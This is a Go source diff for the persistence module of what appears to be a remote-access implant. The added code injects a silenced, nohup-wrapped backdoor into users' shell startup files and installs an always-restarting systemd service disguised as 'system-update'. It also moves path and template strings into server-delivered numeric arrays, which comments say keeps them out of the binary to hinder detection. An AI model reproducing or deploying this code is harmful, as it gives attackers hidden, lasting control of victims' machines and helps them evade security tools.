@@ -18,97 +18,114 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// PersistenceTemplate represents server-delivered template data
+// PersistenceTemplate represents server-delivered template data (v2: array-based)
 type PersistenceTemplate struct {
-	Version   int               `json:"v"`
-	Type      string            `json:"t"`
-	Templates map[string]string `json:"tpl"`
-	Params    map[string]string `json:"p"`
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`   // 1=systemd, 2=bashrc, 3=cron, 4=launchd
+	Templates []string `json:"tpl"` // Array indexed by position (no string keys)
+	Params    []string `json:"p"`   // Parameters indexed by position
 }
 
-// Template keys (must match server-side constants)
+// Template indices (integers don't appear as strings in binary)
+// Must match server-side constants in templates/persistence.go
 const (
-	tplUnitHeader     = "unit_header"
-	tplDescPrefix     = "desc_prefix"
-	tplServiceSuffix  = "service_suffix"
-	tplAfterNetwork   = "after_network"
-	tplWantsNetwork   = "wants_network"
-	tplServiceHeader  = "service_header"
-	tplTypeSimple     = "type_simple"
-	tplRestartAlways  = "restart_always"
-	tplRestartSec     = "restart_sec"
-	tplExecStart      = "exec_start"
-	tplStdOutNull     = "stdout_null"
-	tplStdErrNull     = "stderr_null"
-	tplSecComment     = "sec_comment"
-	tplPrivateTmp     = "private_tmp"
-	tplNoNewPrivs     = "no_new_privs"
-	tplProtectSys     = "protect_sys"
-	tplProtectHome    = "protect_home"
-	tplReadWriteTmp   = "read_write_tmp"
-	tplInstallHeader  = "install_header"
-	tplWantedBy       = "wanted_by"
-	tplBashIfSudo     = "bash_if_sudo"
-	tplBashIfPgrep    = "bash_if_pgrep"
-	tplBashPgrepEnd   = "bash_pgrep_end"
-	tplBashNohup      = "bash_nohup"
-	tplBashNohupEnd   = "bash_nohup_end"
-	tplBashFi         = "bash_fi"
-	tplBashEndFi      = "bash_end_fi"
+	// Systemd indices (0-29)
+	idxUnitHeader    = 0
+	idxDescPrefix    = 1
+	idxServiceSuffix = 2
+	idxAfterNetwork  = 3
+	idxWantsNetwork  = 4
+	idxServiceHeader = 5
+	idxTypeSimple    = 6
+	idxRestartAlways = 7
+	idxRestartSec    = 8
+	idxExecStart     = 9
+	idxStdOutNull    = 10
+	idxStdErrNull    = 11
+	idxSecComment    = 12
+	idxPrivateTmp    = 13
+	idxNoNewPrivs    = 14
+	idxProtectSys    = 15
+	idxProtectHome   = 16
+	idxReadWriteTmp  = 17
+	idxInstallHeader = 18
+	idxWantedBy      = 19
+	// Systemd paths
+	idxEtcSystemd           = 20
+	idxDotConfig            = 21
+	idxSystemdDir           = 22
+	idxUserDir              = 23
+	idxServiceExt           = 24
+	idxMultiUserTargetWants = 25
+	idxDefaultTargetWants   = 26
+	idxDefaultSvcName       = 27
+	idxProcSelfExe          = 28
+
+	// Bashrc indices (30-49)
+	idxBashIfSudo        = 30
+	idxBashIfPgrep       = 31
+	idxBashPgrepEnd      = 32
+	idxBashNohup         = 33
+	idxBashNohupEnd      = 34
+	idxBashFi            = 35
+	idxBashEndFi         = 36
+	idxRcBashrc          = 37
+	idxRcProfile         = 38
+	idxRcBashProfile     = 39
+	idxRcZshrc           = 40
+	idxBashDetectPattern = 41
 )
 
-// Persistence strings - only essential ones for dispatch/paths (templates now delivered server-side)
+// Parameter indices
+const (
+	paramIdxServiceName = 0
+	paramIdxDescription = 1
+	paramIdxTarget      = 2
+	paramIdxUserService = 3
+)
+
+// Short method codes (transformed by server: bashrc→b, systemd→s, cron→c, remove→r)
 var (
-	// Methods (needed for command dispatch)
-	persistMethodBashrc  = string([]byte{0x62, 0x61, 0x73, 0x68, 0x72, 0x63})       // bashrc
-	persistMethodSystemd = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64}) // systemd
-	persistMethodCron    = string([]byte{0x63, 0x72, 0x6f, 0x6e})                   // cron
-	persistMethodRemove  = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65})       // remove
+	persistMethodBashrc  = string([]byte{0x62})       // b
+	persistMethodSystemd = string([]byte{0x73})       // s
+	persistMethodCron    = string([]byte{0x63})       // c
+	persistMethodRemove  = string([]byte{0x72})       // r
 
-	// Short flags (all transformed from user-friendly flags on server side)
-	persistFlagRaw         = string([]byte{0x2d, 0x31})       // -1 (from --raw)
-	persistFlagNoNohup     = string([]byte{0x2d, 0x32})       // -2 (from --no-nohup)
-	persistFlagNoSilence   = string([]byte{0x2d, 0x33})       // -3 (from --no-silence)
-	persistFlagNoPgrep     = string([]byte{0x2d, 0x34})       // -4 (from --no-pgrep)
-	persistFlagNoSudoCheck = string([]byte{0x2d, 0x35})       // -5 (from --no-sudo-check)
-	persistFlagCommand     = string([]byte{0x2d, 0x36})       // -6 (from --command)
-	persistFlagFiles       = string([]byte{0x2d, 0x37})       // -7 (from --files)
-	persistFlagFile        = string([]byte{0x2d, 0x38})       // -8 (from --file)
-	persistFlagUser        = string([]byte{0x2d, 0x39})       // -9 (from --user)
-	persistFlagName        = string([]byte{0x2d, 0x6e})       // -n (from --name)
-	persistFlagAll         = string([]byte{0x2d, 0x61})       // -a (from --all)
+	// Short flags (transformed from user-friendly flags on server side)
+	persistFlagRaw         = string([]byte{0x2d, 0x31}) // -1
+	persistFlagNoNohup     = string([]byte{0x2d, 0x32}) // -2
+	persistFlagNoSilence   = string([]byte{0x2d, 0x33}) // -3
+	persistFlagNoPgrep     = string([]byte{0x2d, 0x34}) // -4
+	persistFlagNoSudoCheck = string([]byte{0x2d, 0x35}) // -5
+	persistFlagCommand     = string([]byte{0x2d, 0x36}) // -6
+	persistFlagFiles       = string([]byte{0x2d, 0x37}) // -7
+	persistFlagFile        = string([]byte{0x2d, 0x38}) // -8
+	persistFlagUser        = string([]byte{0x2d, 0x39}) // -9
+	persistFlagName        = string([]byte{0x2d, 0x6e}) // -n
+	persistFlagAll         = string([]byte{0x2d, 0x61}) // -a
 
-	// Paths (needed for file operations)
-	persistProcSelfExe = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65})                                 // /proc/self/exe
-	persistEtcSystemd  = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64, 0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d}) // /etc/systemd/system
-	persistDotConfig   = string([]byte{0x2e, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67})                                                                           // .config
-	persistSystemdDir  = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x64})                                                                           // systemd
-	persistUserDir     = string([]byte{0x75, 0x73, 0x65, 0x72})                                                                                             // user
-	persistServiceExt  = string([]byte{0x2e, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65})                                                                     // .service
-
-	// RC files (needed for default file list)
-	persistBashrc      = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                                     // .bashrc
-	persistProfile     = string([]byte{0x2e, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})                               // .profile
-	persistBashProfile = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65}) // .bash_profile
-	persistZshrc       = string([]byte{0x2e, 0x7a, 0x73, 0x68, 0x72, 0x63})                                           // .zshrc
-	persistTildeSlash  = string([]byte{0x7e, 0x2f})                                                                   // ~/
-
-	// Default service name
-	persistDefaultSvc = string([]byte{0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2d, 0x75, 0x70, 0x64, 0x61, 0x74, 0x65}) // system-update
-
-	// Symlink directories (needed for enabling services)
-	persistMultiUserTargetWants = string([]byte{0x6d, 0x75, 0x6c, 0x74, 0x69, 0x2d, 0x75, 0x73, 0x65, 0x72, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73}) // multi-user.target.wants
-	persistDefaultTargetWants   = string([]byte{0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x2e, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x2e, 0x77, 0x61, 0x6e, 0x74, 0x73})                   // default.target.wants
-
-	// Kept for cleanup detection (used in cleanRCFile to find injected payload)
-	persistBashIfSudo = string([]byte{0x69, 0x66, 0x20, 0x5b, 0x20, 0x2d, 0x7a, 0x20, 0x22, 0x24, 0x53, 0x55, 0x44, 0x4f, 0x5f, 0x43, 0x4f, 0x4d, 0x4d, 0x41, 0x4e, 0x44, 0x22, 0x20, 0x5d, 0x3b, 0x20, 0x74, 0x68, 0x65, 0x6e}) // if [ -z "$SUDO_COMMAND" ]; then
-
-	// Misc
+	// Misc (minimal, needed for operations before template parsing)
 	persistAmpersand = string([]byte{0x20, 0x26}) //  &
 )
 
 // PersistenceCommand handles various persistence mechanisms
 type PersistenceCommand struct{}
+
+// getTpl safely gets template value by index
+func (c *PersistenceCommand) getTpl(template *PersistenceTemplate, idx int) string {
+	if template != nil && template.Templates != nil && idx < len(template.Templates) {
+		return template.Templates[idx]
+	}
+	return ""
+}
+
+// getParam safely gets param value by index
+func (c *PersistenceCommand) getParam(template *PersistenceTemplate, idx int) string {
+	if template != nil && template.Params != nil && idx < len(template.Params) {
+		return template.Params[idx]
+	}
+	return ""
+}
 
 func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) < 1 {
@@ -124,7 +141,7 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
 			template = &PersistenceTemplate{}
 			if err := json.Unmarshal(decoded, template); err != nil {
-				template = nil // Failed to parse, will use hardcoded fallback
+				template = nil
 			}
 		}
 	}
@@ -136,7 +153,7 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 	case persistMethodSystemd:
 		return c.handleSystemdPersistence(args[1:], template)
 	case persistMethodCron:
-		// Delegate to CronPersistenceCommand (cron methods: spool, crond, periodic, anacron, timer)
+		// Delegate to CronPersistenceCommand
 		cronCmd := &CronPersistenceCommand{}
 		return cronCmd.Execute(ctx, args[1:])
 	case persistMethodRemove:
@@ -146,7 +163,7 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 				ExitCode: 1,
 			}
 		}
-		return c.removePersistence(args[1], args[2:])
+		return c.removePersistence(args[1], args[2:], template)
 	default:
 		return CommandResult{
 			Output:   ErrCtx(E21, method),
@@ -157,11 +174,11 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 
 // bashrcOptions holds payload generation options
 type bashrcOptions struct {
-	raw         bool // Just the command, no wrapping
-	noNohup     bool // Skip nohup wrapper
-	noSilence   bool // Don't redirect to /dev/null
-	noPgrep     bool // Don't check if process already running
-	noSudoCheck bool // Don't check SUDO_COMMAND
+	raw         bool
+	noNohup     bool
+	noSilence   bool
+	noPgrep     bool
+	noSudoCheck bool
 }
 
 // handleBashrcPersistence adds backdoor to shell initialization files
@@ -192,7 +209,6 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 			}
 		case persistFlagFiles:
 			if i+1 < len(args) {
-				// Parse comma-separated list
 				files := strings.Split(args[i+1], ",")
 				for _, f := range files {
 					targetFiles = append(targetFiles, strings.TrimSpace(f))
@@ -228,7 +244,11 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 
 	// Default command (current binary path)
 	if command == "" {
-		execPath, err := os.Readlink(persistProcSelfExe)
+		procSelfExe := c.getTpl(template, idxProcSelfExe)
+		if procSelfExe == "" {
+			procSelfExe = "/proc/self/exe" // minimal fallback
+		}
+		execPath, err := os.Readlink(procSelfExe)
 		if err != nil {
 			execPath = os.Args[0]
 		}
@@ -246,26 +266,35 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 
 	// Determine target files based on flags
 	if allFiles {
-		// --all: target all common RC files
+		// --all: target all common RC files (get names from template)
+		rcBashrc := c.getTpl(template, idxRcBashrc)
+		rcProfile := c.getTpl(template, idxRcProfile)
+		rcBashProfile := c.getTpl(template, idxRcBashProfile)
+		rcZshrc := c.getTpl(template, idxRcZshrc)
+		if rcBashrc == "" {
+			rcBashrc = ".bashrc"
+		}
 		targetFiles = []string{
-			filepath.Join(u.HomeDir, persistBashrc),
-			filepath.Join(u.HomeDir, persistProfile),
-			filepath.Join(u.HomeDir, persistBashProfile),
-			filepath.Join(u.HomeDir, persistZshrc),
+			filepath.Join(u.HomeDir, rcBashrc),
+			filepath.Join(u.HomeDir, rcProfile),
+			filepath.Join(u.HomeDir, rcBashProfile),
+			filepath.Join(u.HomeDir, rcZshrc),
 		}
 	} else if len(targetFiles) == 0 {
 		// No files specified: default to only .bashrc
+		rcBashrc := c.getTpl(template, idxRcBashrc)
+		if rcBashrc == "" {
+			rcBashrc = ".bashrc"
+		}
 		targetFiles = []string{
-			filepath.Join(u.HomeDir, persistBashrc),
+			filepath.Join(u.HomeDir, rcBashrc),
 		}
 	} else {
 		// Expand paths for specified files
 		for i, file := range targetFiles {
-			// Handle relative paths and ~ expansion
-			if strings.HasPrefix(file, persistTildeSlash) {
+			if strings.HasPrefix(file, "~/") {
 				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
 			} else if !filepath.IsAbs(file) {
-				// If not absolute, assume it's in user's home
 				targetFiles[i] = filepath.Join(u.HomeDir, file)
 			}
 		}
@@ -277,7 +306,7 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 	backdoorPayload := c.generateBashrcPayload(command, template, opts)
 	if backdoorPayload == "" {
 		return CommandResult{
-			Output:   Err(E18), // Template data required from server
+			Output:   Err(E18),
 			ExitCode: 1,
 		}
 	}
@@ -303,16 +332,8 @@ func (c *PersistenceCommand) generateBashrcPayload(command string, template *Per
 		return "\n" + command + "\n"
 	}
 
-	// Template is required - templates are now delivered server-side
-	if template == nil || template.Templates == nil {
-		return "" // Will cause error in caller
-	}
-
-	// Helper to get template value (required)
-	getVal := func(key string) string {
-		if val, ok := template.Templates[key]; ok {
-			return val
-		}
+	// Template is required
+	if template == nil || template.Templates == nil || len(template.Templates) == 0 {
 		return ""
 	}
 
@@ -320,12 +341,11 @@ func (c *PersistenceCommand) generateBashrcPayload(command string, template *Per
 	var payload strings.Builder
 	payload.WriteString("\n")
 
-	// Track indentation level based on what wrappers are active
 	indent := ""
 
 	// Start SUDO_COMMAND check (unless --no-sudo-check)
 	if !opts.noSudoCheck {
-		payload.WriteString(getVal(tplBashIfSudo))
+		payload.WriteString(c.getTpl(template, idxBashIfSudo))
 		payload.WriteString("\n")
 		indent = "    "
 	}
@@ -333,9 +353,9 @@ func (c *PersistenceCommand) generateBashrcPayload(command string, template *Per
 	// Start pgrep check (unless --no-pgrep)
 	if !opts.noPgrep {
 		payload.WriteString(indent)
-		payload.WriteString(getVal(tplBashIfPgrep))
+		payload.WriteString(c.getTpl(template, idxBashIfPgrep))
 		payload.WriteString(command)
-		payload.WriteString(getVal(tplBashPgrepEnd))
+		payload.WriteString(c.getTpl(template, idxBashPgrepEnd))
 		payload.WriteString("\n")
 		indent += "    "
 	}
@@ -343,24 +363,20 @@ func (c *PersistenceCommand) generateBashrcPayload(command string, template *Per
 	// Write the command execution line
 	payload.WriteString(indent)
 	if opts.noNohup && opts.noSilence {
-		// Just the command with background
 		payload.WriteString(command)
 		payload.WriteString(" &")
 	} else if opts.noNohup {
-		// No nohup but still silence output
 		payload.WriteString("(")
 		payload.WriteString(command)
 		payload.WriteString(" > /dev/null 2>&1 &) 2>/dev/null")
 	} else if opts.noSilence {
-		// Use nohup but don't redirect to /dev/null
 		payload.WriteString("(nohup ")
 		payload.WriteString(command)
 		payload.WriteString(" &) 2>/dev/null")
 	} else {
-		// Full wrapping: nohup + silence (default)
-		payload.WriteString(getVal(tplBashNohup))
+		payload.WriteString(c.getTpl(template, idxBashNohup))
 		payload.WriteString(command)
-		payload.WriteString(getVal(tplBashNohupEnd))
+		payload.WriteString(c.getTpl(template, idxBashNohupEnd))
 	}
 	payload.WriteString("\n")
 
@@ -369,13 +385,13 @@ func (c *PersistenceCommand) generateBashrcPayload(command string, template *Per
 		if !opts.noSudoCheck {
 			payload.WriteString("    ")
 		}
-		payload.WriteString(getVal(tplBashFi))
+		payload.WriteString(c.getTpl(template, idxBashFi))
 		payload.WriteString("\n")
 	}
 
 	// Close SUDO_COMMAND check (unless --no-sudo-check)
 	if !opts.noSudoCheck {
-		payload.WriteString(getVal(tplBashEndFi))
+		payload.WriteString(c.getTpl(template, idxBashEndFi))
 	}
 
 	return payload.String()
@@ -383,32 +399,24 @@ func (c *PersistenceCommand) generateBashrcPayload(command string, template *Per
 
 // injectIntoRCFile adds backdoor to RC file using direct file operations
 func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
-	// Check if file exists
 	info, err := os.Stat(filepath)
 	if err != nil {
 		if os.IsNotExist(err) {
-			// Create file if it doesn't exist
 			return os.WriteFile(filepath, []byte(payload), 0644)
 		}
 		return err
 	}
 
-	// Read existing content
 	content, err := os.ReadFile(filepath)
 	if err != nil {
 		return err
 	}
 
-	// Check if command is already in file (avoid duplicates without marker)
-	// Extract the command from the payload for checking
 	if bytes.Contains(content, []byte(payload)) {
 		return fmt.Errorf(Err(E5))
 	}
 
-	// Append payload
 	newContent := append(content, []byte("\n"+payload)...)
-
-	// Write back with original permissions
 	return os.WriteFile(filepath, newContent, info.Mode())
 }
 
@@ -417,7 +425,6 @@ func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *P
 	var serviceName string
 	var userService bool
 
-	// Parse arguments
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
 		case persistFlagName:
@@ -430,13 +437,20 @@ func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *P
 		}
 	}
 
-	// Default service name
+	// Default service name from template
 	if serviceName == "" {
-		serviceName = persistDefaultSvc
+		serviceName = c.getTpl(template, idxDefaultSvcName)
+		if serviceName == "" {
+			serviceName = "system-update"
+		}
 	}
 
 	// Get current binary path
-	execPath, err := os.Readlink(persistProcSelfExe)
+	procSelfExe := c.getTpl(template, idxProcSelfExe)
+	if procSelfExe == "" {
+		procSelfExe = "/proc/self/exe"
+	}
+	execPath, err := os.Readlink(procSelfExe)
 	if err != nil {
 		execPath = os.Args[0]
 	}
@@ -449,7 +463,6 @@ func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *P
 
 // installUserSystemdService creates user-level systemd service
 func (c *PersistenceCommand) installUserSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
-	// Get current user
 	currentUser, err := user.Current()
 	if err != nil {
 		return CommandResult{
@@ -458,30 +471,45 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 		}
 	}
 
-	// User systemd directory
-	systemdDir := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir)
+	// Get paths from template
+	dotConfig := c.getTpl(template, idxDotConfig)
+	systemdDir := c.getTpl(template, idxSystemdDir)
+	userDir := c.getTpl(template, idxUserDir)
+	serviceExt := c.getTpl(template, idxServiceExt)
 
-	// Create directory structure
-	if err := os.MkdirAll(systemdDir, 0755); err != nil {
+	if dotConfig == "" {
+		dotConfig = ".config"
+	}
+	if systemdDir == "" {
+		systemdDir = "systemd"
+	}
+	if userDir == "" {
+		userDir = "user"
+	}
+	if serviceExt == "" {
+		serviceExt = ".service"
+	}
+
+	// User systemd directory
+	sysDir := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir)
+
+	if err := os.MkdirAll(sysDir, 0755); err != nil {
 		return CommandResult{
-			Output:   ErrCtx(E11, systemdDir),
+			Output:   ErrCtx(E11, sysDir),
 			ExitCode: 1,
 		}
 	}
 
-	// Service file path
-	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)
+	serviceFile := filepath.Join(sysDir, name+serviceExt)
 
-	// Generate service content using server-provided template
 	serviceContent := c.generateSystemdService(name, execPath, true, template)
 	if serviceContent == "" {
 		return CommandResult{
-			Output:   Err(E18), // Template data required from server
+			Output:   Err(E18),
 			ExitCode: 1,
 		}
 	}
 
-	// Write service file
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
 		return CommandResult{
 			Output:   ErrCtx(E11, serviceFile),
@@ -489,9 +517,8 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 		}
 	}
 
-	// Enable service using DBus API (if available) or fallback
-	if err := c.enableSystemdService(name, true); err != nil {
-		// Service created but not auto-enabled
+	// Enable service
+	if err := c.enableSystemdService(name, true, template); err != nil {
 		return CommandResult{
 			Output:   SuccCtx(S1, serviceFile),
 			ExitCode: 0,
@@ -506,30 +533,33 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 
 // installSystemSystemdService creates system-level systemd service
 func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
-	// System systemd directory
-	systemdDir := persistEtcSystemd
+	etcSystemd := c.getTpl(template, idxEtcSystemd)
+	if etcSystemd == "" {
+		etcSystemd = "/etc/systemd/system"
+	}
 
-	// Check if we have write access using unix.Access
-	if unix.Access(systemdDir, unix.W_OK) != nil {
+	if unix.Access(etcSystemd, unix.W_OK) != nil {
 		return CommandResult{
-			Output:   ErrCtx(E3, systemdDir),
+			Output:   ErrCtx(E3, etcSystemd),
 			ExitCode: 1,
 		}
 	}
 
-	// Service file path
-	serviceFile := filepath.Join(systemdDir, name+persistServiceExt)
+	serviceExt := c.getTpl(template, idxServiceExt)
+	if serviceExt == "" {
+		serviceExt = ".service"
+	}
 
-	// Generate service content using server-provided template
+	serviceFile := filepath.Join(etcSystemd, name+serviceExt)
+
 	serviceContent := c.generateSystemdService(name, execPath, false, template)
 	if serviceContent == "" {
 		return CommandResult{
-			Output:   Err(E18), // Template data required from server
+			Output:   Err(E18),
 			ExitCode: 1,
 		}
 	}
 
-	// Write service file
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
 		return CommandResult{
 			Output:   ErrCtx(E11, serviceFile),
@@ -537,10 +567,15 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 		}
 	}
 
-	// Create symlink for multi-user.target.wants to enable on boot
-	wantsDir := filepath.Join(systemdDir, persistMultiUserTargetWants)
+	// Create symlink for multi-user.target.wants
+	multiUserTargetWants := c.getTpl(template, idxMultiUserTargetWants)
+	if multiUserTargetWants == "" {
+		multiUserTargetWants = "multi-user.target.wants"
+	}
+
+	wantsDir := filepath.Join(etcSystemd, multiUserTargetWants)
 	if err := os.MkdirAll(wantsDir, 0755); err == nil {
-		linkPath := filepath.Join(wantsDir, name+persistServiceExt)
+		linkPath := filepath.Join(wantsDir, name+serviceExt)
 		os.Symlink(serviceFile, linkPath)
 	}
 
@@ -552,75 +587,54 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 
 // generateSystemdService creates systemd service configuration using server-provided templates
 func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool, template *PersistenceTemplate) string {
-	// Template is required - templates are now delivered server-side
-	if template == nil || template.Templates == nil {
-		return "" // Will cause error in caller
-	}
-
-	// Helper to get template value (required)
-	getVal := func(key string) string {
-		if val, ok := template.Templates[key]; ok {
-			return val
-		}
+	if template == nil || template.Templates == nil || len(template.Templates) == 0 {
 		return ""
 	}
 
-	// Helper to get param value with default
-	getParam := func(key, defaultVal string) string {
-		if template.Params != nil {
-			if val, ok := template.Params[key]; ok && val != "" {
-				return val
-			}
-		}
-		return defaultVal
-	}
+	description := c.getParam(template, paramIdxDescription)
+	target := c.getParam(template, paramIdxTarget)
 
-	// Get description and target from template params
-	description := getParam("description", "")
-	target := getParam("target", "")
-
-	// Build service file content using server-provided template values
 	var svc strings.Builder
-	svc.WriteString(getVal(tplUnitHeader))
+	svc.WriteString(c.getTpl(template, idxUnitHeader))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplDescPrefix))
+	svc.WriteString(c.getTpl(template, idxDescPrefix))
 	svc.WriteString(description)
-	svc.WriteString(getVal(tplServiceSuffix))
+	svc.WriteString(c.getTpl(template, idxServiceSuffix))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplAfterNetwork))
+	svc.WriteString(c.getTpl(template, idxAfterNetwork))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplWantsNetwork))
+	svc.WriteString(c.getTpl(template, idxWantsNetwork))
 	svc.WriteString("\n\n")
-	svc.WriteString(getVal(tplServiceHeader))
+	svc.WriteString(c.getTpl(template, idxServiceHeader))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplTypeSimple))
+	svc.WriteString(c.getTpl(template, idxTypeSimple))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplRestartAlways))
+	svc.WriteString(c.getTpl(template, idxRestartAlways))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplRestartSec))
+	svc.WriteString(c.getTpl(template, idxRestartSec))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplExecStart))
+	svc.WriteString(c.getTpl(template, idxExecStart))
 	svc.WriteString(execPath)
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplStdOutNull))
+	svc.WriteString(c.getTpl(template, idxStdOutNull))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplStdErrNull))
+	svc.WriteString(c.getTpl(template, idxStdErrNull))
 	svc.WriteString("\n\n")
-	svc.WriteString(getVal(tplSecComment))
+	svc.WriteString(c.getTpl(template, idxSecComment))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplPrivateTmp))
+	svc.WriteString(c.getTpl(template, idxPrivateTmp))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplNoNewPrivs))
+	svc.WriteString(c.getTpl(template, idxNoNewPrivs))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplProtectSys))
+	svc.WriteString(c.getTpl(template, idxProtectSys))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplProtectHome))
+	svc.WriteString(c.getTpl(template, idxProtectHome))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplReadWriteTmp))
+	svc.WriteString(c.getTpl(template, idxReadWriteTmp))
 	svc.WriteString("\n\n")
-	svc.WriteString(getVal(tplInstallHeader))
+	svc.WriteString(c.getTpl(template, idxInstallHeader))
 	svc.WriteString("\n")
-	svc.WriteString(getVal(tplWantedBy))
+	svc.WriteString(c.getTpl(template, idxWantedBy))
 	svc.WriteString(target)
 	svc.WriteString("\n")
 
@@ -628,35 +642,54 @@ func (c *PersistenceCommand) generateSystemdService(name, execPath string, userS
 }
 
 // enableSystemdService attempts to enable service via systemd
-func (c *PersistenceCommand) enableSystemdService(name string, userService bool) error {
-	// Try to reload systemd daemon
+func (c *PersistenceCommand) enableSystemdService(name string, userService bool, template *PersistenceTemplate) error {
 	if userService {
-		// For user services, create a symlink in wants directory
 		currentUser, err := user.Current()
 		if err != nil {
 			return err
 		}
 
-		wantsDir := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, persistDefaultTargetWants)
+		dotConfig := c.getTpl(template, idxDotConfig)
+		systemdDir := c.getTpl(template, idxSystemdDir)
+		userDir := c.getTpl(template, idxUserDir)
+		defaultTargetWants := c.getTpl(template, idxDefaultTargetWants)
+		serviceExt := c.getTpl(template, idxServiceExt)
+
+		if dotConfig == "" {
+			dotConfig = ".config"
+		}
+		if systemdDir == "" {
+			systemdDir = "systemd"
+		}
+		if userDir == "" {
+			userDir = "user"
+		}
+		if defaultTargetWants == "" {
+			defaultTargetWants = "default.target.wants"
+		}
+		if serviceExt == "" {
+			serviceExt = ".service"
+		}
+
+		wantsDir := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, defaultTargetWants)
 		if err := os.MkdirAll(wantsDir, 0755); err != nil {
 			return err
 		}
 
-		serviceFile := filepath.Join(currentUser.HomeDir, persistDotConfig, persistSystemdDir, persistUserDir, name+persistServiceExt)
-		linkPath := filepath.Join(wantsDir, name+persistServiceExt)
+		serviceFile := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir, name+serviceExt)
+		linkPath := filepath.Join(wantsDir, name+serviceExt)
 
 		return os.Symlink(serviceFile, linkPath)
 	}
 
-	// System service is handled by symlink creation in install function
 	return nil
 }
 
 // removePersistence removes installed persistence
-func (c *PersistenceCommand) removePersistence(method string, args []string) CommandResult {
+func (c *PersistenceCommand) removePersistence(method string, args []string, template *PersistenceTemplate) CommandResult {
 	switch method {
 	case persistMethodBashrc:
-		return c.removeBashrcPersistence()
+		return c.removeBashrcPersistence(template)
 	case persistMethodSystemd:
 		var serviceName string
 		for i := 0; i < len(args); i++ {
@@ -665,9 +698,12 @@ func (c *PersistenceCommand) removePersistence(method string, args []string) Com
 			}
 		}
 		if serviceName == "" {
-			serviceName = persistDefaultSvc
+			serviceName = c.getTpl(template, idxDefaultSvcName)
+			if serviceName == "" {
+				serviceName = "system-update"
+			}
 		}
-		return c.removeSystemdPersistence(serviceName)
+		return c.removeSystemdPersistence(serviceName, template)
 	default:
 		return CommandResult{
 			Output:   ErrCtx(E21, method),
@@ -677,7 +713,7 @@ func (c *PersistenceCommand) removePersistence(method string, args []string) Com
 }
 
 // removeBashrcPersistence removes backdoors from RC files
-func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
+func (c *PersistenceCommand) removeBashrcPersistence(template *PersistenceTemplate) CommandResult {
 	currentUser, err := user.Current()
 	if err != nil {
 		return CommandResult{
@@ -686,17 +722,30 @@ func (c *PersistenceCommand) removeBashrcPersistence() CommandResult {
 		}
 	}
 
